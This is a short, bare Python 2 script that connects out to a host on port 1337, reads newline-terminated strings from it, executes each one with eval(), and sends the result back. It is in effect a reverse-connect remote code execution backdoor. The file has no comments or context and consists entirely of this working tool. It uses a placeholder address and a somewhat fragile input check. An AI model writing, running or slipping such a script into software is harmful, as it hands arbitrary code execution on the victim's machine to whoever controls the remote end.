import socket,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("0.0.0.0",1337))

while True:
    buffer = ""
    try:
        while True:
            data = s.recv(1024)
            if data[-1] == "\n":
                data = data[:-1]
                buffer = buffer + data
                print "BREAk"
                break
            if not data:
                print "BREAk"
                break
            buffer = buffer + data
    except Exception as e:
        print str(e)
        pass
    try:
        print "Evaluating"
        resp = eval(buffer)
        print resp
        s.send(str(resp))
        s.send("\n")
    except Exception as e:
        print "Exception: {}".format(str(e))
        s.send("{}".format(str(e)))
